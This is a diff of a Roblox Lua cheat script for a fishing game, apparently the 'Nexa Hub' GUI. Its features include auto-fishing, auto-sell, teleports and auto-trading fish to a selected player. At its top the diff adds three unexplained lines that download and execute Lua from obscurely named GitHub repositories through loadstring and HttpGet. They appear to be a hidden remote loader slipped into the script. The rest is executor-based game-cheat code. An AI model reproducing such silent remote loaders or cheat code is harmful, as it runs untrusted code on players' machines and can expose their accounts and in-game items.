@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fwefefhef%20Gui%20Update"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/Webhook%20Fish%20Gui%20dywfywgfwyfvwydgvy"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xwvufdwgqudwyfwdvwedyuvwd/gbewufbeufbeugfvr/refs/heads/main/Semua"))()
 local MacLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Enow-Development/maclib-extended/refs/heads/main/maclib.lua"))()
 
 -- Deklarasi service dan variabel utama (tidak diubah) jangan di ubah ubah sama sekali
@@ -65,7 +68,10 @@ local GameData = {
 
    -- ================== [Auto Trade] ==================
 
-    	TierMap001 = {
+	-----------------------------------------------------
+	-- TIER DATA
+	-----------------------------------------------------
+	TierMap001 = {
 		[1] = "Common",
 		[2] = "Uncommon",
 		[3] = "Rare",
@@ -75,8 +81,13 @@ local GameData = {
 		[7] = "SECRET"
 	},
 
-	TierList001 = { "Common","Uncommon","Rare","Epic","Legendary","Mythic","SECRET" },
+	TierList001 = {
+		"Common","Uncommon","Rare","Epic","Legendary","Mythic","SECRET"
+	},
 
+	-----------------------------------------------------
+	-- CORE
+	-----------------------------------------------------
 	RS = ReplicatedStorage,
 	Players = Players,
 	player = Players.LocalPlayer,
@@ -84,6 +95,7 @@ local GameData = {
 	Net = require(ReplicatedStorage.Packages.Net),
 	ReplionClient = require(ReplicatedStorage.Packages.Replion).Client,
 	DataReplion = nil,
+
 	ItemUtility = require(ReplicatedStorage.Shared.ItemUtility),
 
 	TradeRemote = ReplicatedStorage
@@ -95,6 +107,9 @@ local GameData = {
 
 	ItemsFolder = ReplicatedStorage:WaitForChild("Items"),
 
+	-----------------------------------------------------
+	-- STATE
+	-----------------------------------------------------
 	state = {
 		selectedTiers = {},
 		Auto2Trade = false,
@@ -141,20 +156,18 @@ local GameData = {
     SelectedTiers = {},
     TierList = {"All","Common","Uncommon","Rare","Epic","Legendary","Mythic","SECRET"},
 
-    -- SERVICES
     Service = {
         Players = game:GetService("Players"),
         ReplicatedStorage = game:GetService("ReplicatedStorage"),
         HttpService = game:GetService("HttpService"),
     },
 
-    -- EXECUTOR REQUEST
     Request = (syn and syn.request)
         or http_request
+        or (krnl and request)
         or (fluxus and fluxus.request)
-        or (krnl and request),
+        or request,
 
-    -- FISHING SYSTEM DATA
     TierMap = {
         [1] = "Common",
         [2] = "Uncommon",
@@ -186,8 +199,6 @@ local GameData = {
     },
 
     LastFishData = nil,
-
-    -- RUN-TIME UI STORAGE
     UI = {},
 
     -- ================== [Instant Fishing] ==================
@@ -210,6 +221,21 @@ local GameData = {
 
     lastCatchTime = os.clock(),
     antiStuckTime = 10,
+
+    -- ================== [Auto Sell] ==================
+
+    Players = game:GetService("Players"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    LocalPlayer = nil,
+
+    SellRemote = nil,
+
+    AutoSell = false,
+    SellDelay = 2,
+    Mode = "Sell Delay",
+    AutoSellLoop = nil,
+
+    BagLabel = nil,
 
     -- ================== [Rod] ==================
     RodIDs = {
@@ -439,54 +465,10 @@ local GameData = {
     startBlatantV2 = nil,
 
     -- ================== [Treasure] ==================
-    Players = game:GetService("Players"),
-    Player = nil,
-    Character = nil,
-    HRP = nil,
 
-    AutoTreasure = false,
-    AutoTreasureThread = nil,
-
-    GetAllSunkenModels = nil,
-    ProcessOneWreckage = nil,
-    AutoTreasureLoop = nil,
-
-    TempList = nil,
-    TempTreasure = nil,
-    TempShine = nil,
-    TempPrompt = nil,
 
     -- ================== [Event Hunt] ==================
 
-        --// Services
-    Players = game:GetService("Players"),
-    RS = game:GetService("ReplicatedStorage"),
-
-    -- Player
-    player = game:GetService("Players").LocalPlayer,
-    char = nil,
-    hrp = nil,
-
-    -- Folders
-    exclaimFolder = nil,
-
-    -- Event List
-    eventsList = {
-        "Shark Hunt", "Ghost Shark Hunt", "Worm Hunt",
-        "Black Hole", "Shocked", "Ghost Worm",
-        "Meteor Rain", "Megalodon Hunt"
-    },
-
-    -- Auto settings
-    SelectedAutoEvents = {},
-    AutoEventPriority = {},
-    AutoEventToggle = false,
-
-    savedCFrame = nil,
-
-    -- Runtime objects
-    platform = nil,
-    atEvent = false,
 
     -- ================== [SKip Rraity] ==================
         SVC = {
@@ -2183,6 +2165,7 @@ sections.Fishing4:Input({
     end,
 }, "CompleteDelayInput")
 
+
 sections.Fishing5:Header({
 	Name = "Blatant V2"
 })
@@ -2232,8 +2215,8 @@ GameData.EnableSkip()
 
 -- GLOBAL CONFIG
 _G.BlatantV2 = false
-_G.DelayLoopStartV2 = 0.80
-_G.DelayCompleteV2 = 1
+_G.DelayLoopStartV2 = 1.9
+_G.DelayCompleteV2 = 0.8
 
 -- FASTEST FUNCTION
 GameData.Fastest = function()
@@ -2277,7 +2260,7 @@ sections.Fishing5:Toggle({
 
 sections.Fishing5:Input({
     Name = "Delay Cast V2",
-    Placeholder = "0.80",
+    Placeholder = "1.9",
     AcceptedCharacters = "Numbers",
     Callback = function(input)
         local num = tonumber(input)
@@ -2289,7 +2272,7 @@ sections.Fishing5:Input({
 
 sections.Fishing5:Input({
     Name = "Delay Complete V2",
-    Placeholder = "1",
+    Placeholder = "0.8",
     AcceptedCharacters = "Numbers",
     Callback = function(input)
         local num = tonumber(input)
@@ -2299,278 +2282,28 @@ sections.Fishing5:Input({
     end,
 }, "DelayCompleteV2Input")
 
+sections.Fishing5:Paragraph({
+    Header = "Rod Settings By Owner Nexa Hub",
+    Body = [[
+Elements No Skin:
+Map: Sisyphus Statue
+Delay Cast V2: 1.85555
+Delay Complete V2: 0.95
+
+Map: Esoteric Depths
+Delay Cast V2: 1.8555
+Delay Complete V2: 0.8
+
+Map: Anciet Ruin
+Delay Cast V2: 1.9
+Delay Complete V2: 0.95
+]]
+}, "info")
 
 sections.Fishing6:Header({
 	Name = "Webhook Notifier"
 })
 
-GameData.LocalPlayer         = GameData.Service.Players.LocalPlayer
-GameData.ReplicatedStorage   = GameData.Service.ReplicatedStorage
-GameData.HttpService         = GameData.Service.HttpService
-GameData.RequestExecutor     = GameData.Request
-
-
---========================================================--
--- UI SETUP
---========================================================--
-
-sections.Fishing6:Input({
-    Name = "Webhook URL",
-    Placeholder = "Masukkan Webhook",
-    AcceptedCharacters = "All",
-    Callback = function(input)
-        GameData.WebhookURL = input
-    end,
-}, "WebhookURLInput")
-
-sections.Fishing6:Toggle({
-    Name = "Webhook Status",
-    Default = false,
-    Callback = function(value)
-        GameData.WebhookActive = value
-        Window:Notify({
-            Title = "Webhook",
-            Description = value and "Enabled Webhook" or "Disabled Webhook"
-        })
-    end,
-}, "WebhookToggle")
-
-sections.Fishing6:Dropdown({
-	Name = "Filter Tier",
-	Search = false,
-	Multi = true,
-	Required = false,
-	Options = GameData.TierList,
-	Default = {"All"},
-	Callback = function(Value)
-
-		GameData.SelectedTiers = {}
-
-		for Tier, State in pairs(Value) do
-			if State then
-				table.insert(GameData.SelectedTiers, Tier)
-			end
-		end
-	end,
-}, "TierFilter")
-
-
---========================================================--
--- FORMAT FUNCTIONS
---========================================================--
-
-GameData.FormatNumber = function(num)
-    num = tonumber(num) or 0
-    if num >= 1e9 then
-        return string.format("%.2fb", num / 1e9)
-    elseif num >= 1e6 then
-        return string.format("%.2fm", num / 1e6)
-    elseif num >= 1e3 then
-        return string.format("%.2fk", num / 1e3)
-    else
-        return tostring(num)
-    end
-end
-
-GameData.FormatChance = function(chance)
-    chance = tonumber(chance) or 0
-    return string.format("%.2f%%", chance * 100)
-end
-
-
---========================================================--
--- ROBLOX THUMBNAIL
---========================================================--
-
-GameData.GetRobloxImage = function(assetId)
-
-    if not assetId then return nil end
-
-    local url = "https://thumbnails.roblox.com/v1/assets?assetIds=" .. assetId .. "&size=420x420&format=Png&isCircular=false"
-    local success, response = pcall(game.HttpGet, game, url)
-
-    if success then
-        local data = GameData.HttpService:JSONDecode(response)
-        if data and data.data and data.data[1] and data.data[1].imageUrl then
-            return data.data[1].imageUrl
-        end
-    end
-
-    return nil
-end
-
-
---========================================================--
--- WEBHOOK SENDER
---========================================================--
-
-GameData.SendEmbed = function(data)
-    if GameData.WebhookURL == "" then return end
-    if not GameData.RequestExecutor then return end
-
-    GameData.RequestExecutor({
-        Url = GameData.WebhookURL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = GameData.HttpService:JSONEncode({embeds = data.embeds})
-    })
-end
-
-
---========================================================--
--- FIND FISH MODULE
---========================================================--
-
-GameData.FindFishModule = function(fishName)
-
-    local ItemsFolder = GameData.ReplicatedStorage:WaitForChild("Items")
-
-    for _, moduleScript in ipairs(ItemsFolder:GetChildren()) do
-        if moduleScript:IsA("ModuleScript") then
-            local ok, data = pcall(require, moduleScript)
-            if ok and data and data.Data and data.Data.Name then
-                if string.find(string.lower(fishName), string.lower(data.Data.Name)) then
-                    return data
-                end
-            end
-        end
-    end
-
-    return nil
-end
-
-
---========================================================--
--- UI REFERENCES (AUTO)
---========================================================--
-
-local notif = GameData.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Small Notification")
-
-GameData.UI.Container      = notif.Display.Container
-GameData.UI.ItemName       = GameData.UI.Container:WaitForChild("ItemName")
-GameData.UI.NewLabel       = notif.Display.NewFrame.Frame:WaitForChild("NewLabel")
-GameData.UI.VectorFrame    = notif.Display.VectorFrame.Vector
-GameData.UI.RarityLabel    = GameData.UI.Container:WaitForChild("Rarity")
-GameData.UI.BagLabel       = GameData.LocalPlayer.PlayerGui.Inventory.Main.Top.Options.Fish.Label.BagSize
-
-
---========================================================--
--- MAIN WEBHOOK LISTENER
---========================================================--
-
-GameData.UI.ItemName:GetPropertyChangedSignal("Text"):Connect(function()
-
-    if not (GameData.WebhookActive and GameData.WebhookURL ~= "" and GameData.RequestExecutor) then
-        return
-    end
-
-    local text = GameData.UI.ItemName.Text
-    if text == "" then return end
-
-    -- extract
-    local fishName, fishWeight = text:match("^(.-)%s*%((.-)%)$")
-    fishName = fishName or text
-    fishWeight = fishWeight or "Unknown"
-
-    local fishData = GameData.FindFishModule(fishName)
-    local tierNum = fishData and fishData.Data.Tier or 0
-    local tierName = GameData.TierMap[tierNum] or "Unknown"
-
-    local sellPrice = fishData and fishData.SellPrice or "Unknown"
-    local chance    = fishData and fishData.Probability and fishData.Probability.Chance or 0
-
-    local currentData = {
-        Fish = fishName,
-        Weight = fishWeight,
-        Bag = GameData.UI.BagLabel.Text,
-        Rarity = GameData.UI.RarityLabel.Text
-    }
-
-    -- avoid duplicate spam
-    if GameData.LastFishData
-    and GameData.LastFishData.Fish == currentData.Fish
-    and GameData.LastFishData.Weight == currentData.Weight
-    and GameData.LastFishData.Bag == currentData.Bag
-    and GameData.LastFishData.Rarity == currentData.Rarity then
-        return
-    end
-
-    GameData.LastFishData = currentData
-
-    -- tier filter
-    if #GameData.SelectedTiers > 0 then
-        if not table.find(GameData.SelectedTiers, "All") and not table.find(GameData.SelectedTiers, tierName) then
-            return
-        end
-    end
-
-    -- stats
-    if GameData.FishCounter[tierName] then
-        GameData.FishCounter[tierName] = GameData.FishCounter[tierName] + 1
-    end
-
-    -- thumbnail
-    local assetId = string.match(GameData.UI.VectorFrame.Image, "%d+")
-    local imageUrl = GameData.GetRobloxImage(assetId)
-
-
-    -- DISCORD EMBED
-    local embed = {{
-
-        ["title"] = "🎣 **Fish Caught!**",
-
-        ["description"] = string.format(
-            "### 🐟 **%s**\n" ..
-            "```\nWeight : %s\nTier   : %s\nRarity : %s\nBag    : %s\n```\n\n" ..
-            "### 💰 Stats\n" ..
-            "- **Sell Price:** `%s`\n" ..
-            "- **Chance:** `%s`\n",
-            fishName,
-            fishWeight,
-            tierName,
-            currentData.Rarity,
-            currentData.Bag,
-            GameData.FormatNumber(sellPrice),
-            GameData.FormatChance(chance)
-        ),
-
-        ["color"] = GameData.TierColor[tierName] or 5814783,
-
-        ["thumbnail"] = {
-            ["url"] = imageUrl or "https://i.imgur.com/zwCkN8P.png"
-        },
-
-        ["image"] = {
-            ["url"] = "https://i.imgur.com/4PfH6rb.jpeg"
-        },
-
-        ["author"] = {
-            ["name"] = "Nexa | Fishing System",
-            ["icon_url"] = "https://i.imgur.com/4PfH6rb.jpeg"
-        },
-
-        ["footer"] = {
-            ["text"] = "Caught by " .. GameData.LocalPlayer.Name .. " | " .. os.date("%H:%M:%S"),
-            ["icon_url"] = "https://tr.rbxcdn.com/180DAY-f446c1264701227ae463835b155f44af/768/432/Image/Webp/noFilter"
-        },
-
-        ["fields"] = {
-            {
-                ["name"] = "📊 Total " .. tierName .. " Caught",
-                ["value"] = "**" .. tostring(GameData.FishCounter[tierName]) .. "**",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🧭 Rarity",
-                ["value"] = currentData.Rarity,
-                ["inline"] = true
-            }
-        }
-    }}
-
-    GameData.SendEmbed({embeds = embed})
-
-end)
 
 sections.Fishing7:Header({
 	Name = "Equipment Feature"
@@ -2715,330 +2448,96 @@ sections.Fishing8:Header({
 	Name = "Sell Feature"
 })
 
--- ==========================================================
--- AUTO SELL VARIABLES
--- ==========================================================
-local sellRemote = ReplicatedStorage:WaitForChild("Packages")
+GameData.LocalPlayer = GameData.Players.LocalPlayer
+
+GameData.SellRemote = GameData.ReplicatedStorage
+    :WaitForChild("Packages")
     :WaitForChild("_Index")
     :WaitForChild("sleitnick_net@0.2.0")
     :WaitForChild("net")
     :WaitForChild("RF/SellAllItems")
 
-local autoSell = false
-local sellDelay = 2
-local mode = "Sell Delay"
-local autoSellLoop = nil
+task.spawn(function()
+    pcall(function()
+        GameData.BagLabel = GameData.LocalPlayer
+            :WaitForChild("PlayerGui")
+            :WaitForChild("Inventory")
+            :WaitForChild("Main")
+            :WaitForChild("Top")
+            :WaitForChild("Options")
+            :WaitForChild("Fish")
+            :WaitForChild("Label")
+            :WaitForChild("BagSize")
+    end)
+end)
 
--- ==========================================================
--- WINDUI: Slider Sell Delay
--- ==========================================================
 sections.Fishing8:Slider({
-	Name = "Sell Delay (seconds)",
-	Default = 2,
-	Minimum = 1,
-	Maximum = 100,
-	Rounding = 0,
-	Callback = function(value)
-		sellDelay = value
-	end,
+    Name = "Sell Delay (seconds)",
+    Default = 2,
+    Minimum = 1,
+    Maximum = 100,
+    Rounding = 0,
+    Callback = function(value)
+        GameData.SellDelay = value
+    end,
 }, "SellDelaySlider")
 
--- ==========================================================
--- WINDUI: Dropdown Mode
--- ==========================================================
 sections.Fishing8:Dropdown({
-	Name = "Select Mode",
-	Options = { "Backpack Full", "Sell Delay" },
-	Default = "Sell Delay",
-	Multi = false,
-	Search = false,
-	MaxVisibleDropdownItems = 5,
-	Callback = function(option)
-		mode = option
-	end,
+    Name = "Select Mode",
+    Options = { "Backpack Full", "Sell Delay" },
+    Default = "Sell Delay",
+    Callback = function(option)
+        GameData.Mode = option
+    end,
 }, "SellModeDropdown")
 
--- ==========================================================
--- WINDUI: Toggle Auto Sell
--- ==========================================================
 sections.Fishing8:Toggle({
-	Name = "Auto Sell All Items",
-	Default = false,
-	Callback = function(state)
-		autoSell = state
-
-		if state then
-			autoSellLoop = task.spawn(function()
-				while autoSell do
-					pcall(function()
-						if mode == "Sell Delay" then
-							sellRemote:InvokeServer()
-							task.wait(sellDelay)
-						elseif mode == "Backpack Full" then
-							local bagLabel = LocalPlayer.PlayerGui.Inventory.Main.Top.Options.Fish.Label.BagSize
-							if bagLabel and bagLabel.Text == "4,400/4,400" then
-								sellRemote:InvokeServer()
-							end
-							task.wait(1)
-						end
-					end)
-				end
-			end)
-		else
-			if autoSellLoop then
-				task.cancel(autoSellLoop)
-				autoSellLoop = nil
-			end
-		end
-	end,
-}, "AutoSellToggle")
-
-sections.Event:Header({
-	Name = "Event Hunt"
-})
-
--- Setup player
-GameData.Player = GameData.Players.LocalPlayer
-GameData.Character = GameData.Player.Character or GameData.Player.CharacterAdded:Wait()
-GameData.HRP = GameData.Character:WaitForChild("HumanoidRootPart")
-
--- ===========================================================
--- 🔥 FUNGSI: Ambil semua Sunken Wreckage
--- ===========================================================
-GameData.GetAllSunkenModels = function()
-    GameData.TempList = {}
-
-    for _, v in pairs(workspace:GetChildren()) do
-        if v.Name == "Sunken Wreckage" and v:IsA("Model") then
-            table.insert(GameData.TempList, v)
-        end
-    end
-
-    return GameData.TempList
-end
-
--- ===========================================================
--- 🔥 FUNGSI: Proses 1 Wreckage
--- ===========================================================
-GameData.ProcessOneWreckage = function(Wreck)
-    if not Wreck then return end
-
-    GameData.TempTreasure = Wreck:FindFirstChild("Treasure")
-    if not GameData.TempTreasure then return end
-
-    GameData.TempShine = GameData.TempTreasure:FindFirstChild("Shine")
-    if not GameData.TempShine then return end
-
-    GameData.TempPrompt = GameData.TempShine:FindFirstChild("ProximityPrompt")
-    if not GameData.TempPrompt then return end
-
-    -- Teleport
-    GameData.HRP.CFrame = GameData.TempTreasure.CFrame + Vector3.new(0, 3, 0)
-
-    repeat task.wait() until GameData.TempPrompt.Enabled and GameData.TempPrompt.Parent ~= nil
-
-    task.wait(0.15)
-    fireproximityprompt(GameData.TempPrompt)
-end
-
--- ===========================================================
--- 🔥 LOOP OTOMATIS
--- ===========================================================
-GameData.AutoTreasureLoop = function()
-    while GameData.AutoTreasure do
-
-        GameData.TempList = GameData.GetAllSunkenModels()
-
-        for _, wreck in ipairs(GameData.TempList) do
-
-            if not GameData.AutoTreasure then break end
-
-            GameData.ProcessOneWreckage(wreck)
-
-            task.wait(0.5)
-            while wreck:FindFirstChild("Treasure") do
-                if not GameData.AutoTreasure then break end
-                task.wait(0.2)
-            end
-        end
-
-        task.wait(1)
-    end
-end
-
--- ===========================================================
--- 🔘 TOGGLE UI
--- ===========================================================
-sections.Event:Toggle({
-    Name = "Auto Treasure Hunt",
+    Name = "Auto Sell All Items",
     Default = false,
-
     Callback = function(state)
-        GameData.AutoTreasure = state
-
-        Window:Notify({
-            Title = "Treasure Hunt",
-            Description = (state and "Enabled" or "Disabled") .. " Auto Treasure Hunt"
-        })
+        GameData.AutoSell = state
 
         if state then
-            GameData.AutoTreasureThread = task.spawn(GameData.AutoTreasureLoop)
+            GameData.AutoSellLoop = task.spawn(function()
+                while GameData.AutoSell do
+                    pcall(function()
+                        if GameData.Mode == "Sell Delay" then
+                            GameData.SellRemote:InvokeServer()
+                            task.wait(GameData.SellDelay)
+
+                        elseif GameData.Mode == "Backpack Full" then
+                            if GameData.BagLabel then
+                                local text = GameData.BagLabel.Text
+                                local current, max = text:match("([%d,]+)/([%d,]+)")
+
+                                if current and max then
+                                    current = tonumber(current:gsub(",", ""))
+                                    max = tonumber(max:gsub(",", ""))
+
+                                    if current >= max then
+                                        GameData.SellRemote:InvokeServer()
+                                    end
+                                end
+                            end
+                            task.wait(1)
+                        end
+                    end)
+                end
+            end)
+        else
+            if GameData.AutoSellLoop then
+                task.cancel(GameData.AutoSellLoop)
+                GameData.AutoSellLoop = nil
+            end
         end
     end,
-}, "AutoTreasureHuntToggle")
+}, "AutoSellToggle")
 
 
--- Character
-GameData.char = GameData.player.Character or GameData.player.CharacterAdded:Wait()
-GameData.hrp = GameData.char:WaitForChild("HumanoidRootPart")
+sections.Event:Header({
+	Name = "Event Hunt (Fix Bug)"
+})
 
--- Folder
-GameData.exclaimFolder = workspace:WaitForChild("!!! MENU RINGS")
-
-
----------------------------------------------------------
---⭕ DROPDOWN BARU: Select Auto Events
----------------------------------------------------------
-sections.Event:Dropdown({
-	Name = "Select Auto Events",
-	Search = true,
-	Multi = true,
-	Required = false,
-	Options = GameData.eventsList,
-	Default = {},
-	Callback = function(Value)
-		local result = {}
-
-		for eventName, state in next, Value do
-			if state then table.insert(result, eventName) end
-		end
-
-		GameData.SelectedAutoEvents = result
-	end
-}, "SelectAutoEventsNew")
-
-
----------------------------------------------------------
---⭕ DROPDOWN BARU: Auto Event Priority
----------------------------------------------------------
-sections.Event:Dropdown({
-	Name = "Priority Events",
-	Search = true,
-	Multi = true,
-	Required = false,
-	Options = GameData.eventsList,
-	Default = {},
-	Callback = function(Value)
-		local result = {}
-
-		for eventName, state in next, Value do
-			if state then table.insert(result, eventName) end
-		end
-
-		GameData.AutoEventPriority = result
-	end
-}, "PriorityEventsNew")
-
-
----------------------------------------------------------
---⭕ TOGGLE BARU: Auto Join Event
----------------------------------------------------------
-sections.Event:Toggle({
-	Name = "Auto Join Event",
-	Default = false,
-	Callback = function(v)
-
-		if v and not GameData.savedCFrame then
-			if GameData.hrp then
-				GameData.savedCFrame = GameData.hrp.CFrame
-			else
-				Window:Notify({
-					Title = "Error",
-					Description = "Character not loaded!",
-				})
-				return false
-			end
-		end
-
-		GameData.AutoEventToggle = v
-
-		if not v and GameData.savedCFrame then
-			task.wait(0.1)
-			if GameData.hrp then
-				GameData.hrp.CFrame = GameData.savedCFrame + Vector3.new(0, 5, 0)
-			end
-		end
-	end
-}, "ToggleAutoEventNew")
-
-
----------------------------------------------------------
---⭕ AUTO EVENT LOOP
----------------------------------------------------------
-task.spawn(function()
-
-    while task.wait(1) do
-        if GameData.AutoEventToggle and GameData.hrp then
-            
-            local searchOrder = {}
-
-            for _, v in ipairs(GameData.AutoEventPriority) do
-                table.insert(searchOrder, v)
-            end
-
-            for _, v in ipairs(GameData.SelectedAutoEvents) do
-                if not table.find(searchOrder, v) then
-                    table.insert(searchOrder, v)
-                end
-            end
-
-            local targetFound = nil
-
-            for _, eventName in ipairs(searchOrder) do
-                for _, prop in pairs(GameData.exclaimFolder:GetChildren()) do
-                    for _, d in pairs(prop:GetDescendants()) do
-                        if d.Name == eventName then
-                            targetFound = d
-                            break
-                        end
-                    end
-                    if targetFound then break end
-                end
-                if targetFound then break end
-            end
-
-            if targetFound and targetFound:IsA("BasePart") then
-                local pos = targetFound.CFrame.Position
-
-                if not GameData.platform or not GameData.platform.Parent then
-                    GameData.platform = Instance.new("Part")
-                    GameData.platform.Anchored = true
-                    GameData.platform.CanCollide = true
-                    GameData.platform.Transparency = 1
-                    GameData.platform.Size = Vector3.new(10, 1, 10)
-                    GameData.platform.Parent = workspace
-                end
-
-                GameData.platform.Position = pos + Vector3.new(0,5,0)
-                GameData.hrp.CFrame = CFrame.new(GameData.platform.Position + Vector3.new(0, 3, 0))
-
-                GameData.atEvent = true
-            else
-                if GameData.atEvent and GameData.savedCFrame then
-                    GameData.hrp.CFrame = GameData.savedCFrame + Vector3.new(0,5,0)
-                    GameData.atEvent = false
-                    if GameData.platform then GameData.platform:Destroy() GameData.platform = nil end
-                end
-            end
-        end
-    end
-end)
-
-
-GameData.player.CharacterAdded:Connect(function()
-    task.wait(0.2)
-    GameData.hrp = GameData.player.Character:WaitForChild("HumanoidRootPart")
-end)
 
 sections.Quest:Header({
 	Name = "View Quest Status"
@@ -3965,12 +3464,12 @@ sections.Auto2:Header({
 	Name = "Auto Trade"
 })
 
+
 --// SERVICES
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 
 
---// INIT
 GameData.DataReplion = GameData.ReplionClient:WaitReplion("Data")
 GameData.TierList = GameData.TierList001
 
@@ -3978,10 +3477,15 @@ for num, name in pairs(GameData.TierMap001) do
 	GameData.nameToTier[name] = num
 end
 
---// FUNCTIONS
+---------------------------------------------------------
+-- FUNCTIONS
+---------------------------------------------------------
+
 function GameData.normalize(value)
 	if not value then return {} end
-	if type(value) == "string" then return { value } end
+	if type(value) == "string" then
+		return { value }
+	end
 
 	local out = {}
 	for k, v in pairs(value) do
@@ -4009,12 +3513,18 @@ function GameData.safeTrade(userid, uuid)
 	end)
 end
 
+---------------------------------------------------------
+-- AUTO TRADE WORKER
+---------------------------------------------------------
+
 function GameData.workerTrade()
 	GameData.RATE = 0.15
 	GameData.LOOP_DELAY = 1
 
 	while GameData.state.Auto2Trade do
-		if GameData.state.stopTrade then return end
+		if GameData.state.stopTrade then
+			return
+		end
 
 		local target = Players:FindFirstChild(GameData.state.targetPlayer)
 		if not target then
@@ -4031,7 +3541,11 @@ function GameData.workerTrade()
 			end)
 
 			if ok and data and data.Data then
-				if data.Data.Type == "Fish" and GameData.isTierMatch(data.Data.Tier, GameData.state.selectedTiers) then
+				if data.Data.Type == "Fish"
+					and GameData.isTierMatch(
+						data.Data.Tier,
+						GameData.state.selectedTiers
+					) then
 					table.insert(list, item.UUID)
 				end
 			end
@@ -4047,7 +3561,10 @@ function GameData.workerTrade()
 		end
 
 		for _, uuid in ipairs(list) do
-			if not GameData.state.Auto2Trade then break end
+			if not GameData.state.Auto2Trade then
+				break
+			end
+
 			GameData.safeTrade(target.UserId, uuid)
 			task.wait(GameData.RATE)
 		end
@@ -4056,7 +3573,10 @@ function GameData.workerTrade()
 	end
 end
 
---// NOTIF
+---------------------------------------------------------
+-- NOTIFICATION LISTENER
+---------------------------------------------------------
+
 GameData.notifGui = GameData.player.PlayerGui:WaitForChild("Text Notifications")
 GameData.notifFrame = GameData.notifGui:WaitForChild("Frame")
 
@@ -4064,14 +3584,23 @@ function GameData.checkTradeTile(tile)
 	local header = tile:FindFirstChild("Header")
 	if header and header:IsA("TextLabel") then
 		if header.Text == "Trade completed!" then
-			GameData.state.fishCount += 1
+
+			GameData.state.fishCount =
+				GameData.state.fishCount + 1
 
 			Window:Notify({
 				Title = "Trade",
-				Description = "Trade completed! (" .. GameData.state.fishCount .. "/" .. GameData.state.fishTarget .. ")"
+				Description =
+					"Trade completed! ("
+					.. GameData.state.fishCount
+					.. "/"
+					.. GameData.state.fishTarget
+					.. ")"
 			})
 
-			if GameData.state.fishTarget > 0 and GameData.state.fishCount >= GameData.state.fishTarget then
+			if GameData.state.fishTarget > 0
+				and GameData.state.fishCount >= GameData.state.fishTarget then
+
 				GameData.state.Auto2Trade = false
 				GameData.state.stopTrade = true
 
@@ -4100,12 +3629,13 @@ GameData.notifFrame.ChildAdded:Connect(function(child)
 end)
 
 ---------------------------------------------------------
---// UI
+-- UI
 ---------------------------------------------------------
 
--- DROPDOWN TARGET PLAYER (DisplayName @Username)
+-- MAP LABEL → USERNAME
 local PlayerMap = {}
 
+-- PLAYER DROPDOWN
 local PlayerDropdown = sections.Auto2:Dropdown({
 	Name = "Select Target Player",
 	Search = true,
@@ -4118,13 +3648,13 @@ local PlayerDropdown = sections.Auto2:Dropdown({
 			GameData.state.targetPlayer = PlayerMap[label]
 			Window:Notify({
 				Title = "Target",
-				Description = "Selected: "..label
+				Description = "Selected: " .. label
 			})
 		end
 	end,
 }, "PlayerDropdown")
 
--- REFRESH FUNCTION
+-- REFRESH PLAYER LIST
 local function RefreshPlayers()
 	local Options = {}
 	table.clear(PlayerMap)
@@ -4146,10 +3676,8 @@ local function RefreshPlayers()
 	end
 end
 
--- Auto2 LOAD
 RefreshPlayers()
 
--- REFRESH BUTTON
 sections.Auto2:Button({
 	Name = "Refresh Player List",
 	Callback = function()
@@ -4157,7 +3685,7 @@ sections.Auto2:Button({
 	end,
 })
 
--- FISH AMOUNT INPUT
+-- TARGET AMOUNT
 sections.Auto2:Input({
 	Name = "Fish Amount Trade",
 	Placeholder = "Example: 10",
@@ -4186,23 +3714,27 @@ sections.Auto2:Dropdown({
 	Search = true,
 	Multi = true,
 	Options = GameData.TierList001,
-	Default = {"Rare"},
+	Default = { "Rare" },
 	Callback = function(val)
 		GameData.state.selectedTiers = GameData.normalize(val)
 		Window:Notify({
 			Title = "Tier Selected",
-			Description = table.concat(GameData.state.selectedTiers, ", ")
+			Description = table.concat(
+				GameData.state.selectedTiers,
+				", "
+			)
 		})
 	end
 }, "TierDropdown")
 
--- Auto Trade TOGGLE
+-- AUTO TRADE TOGGLE
 sections.Auto2:Toggle({
 	Name = "Auto Trade",
 	Default = false,
 	Callback = function(b)
 		GameData.state.Auto2Trade = b
 		GameData.state.stopTrade = not b
+
 		if b then
 			task.spawn(GameData.workerTrade)
 		end
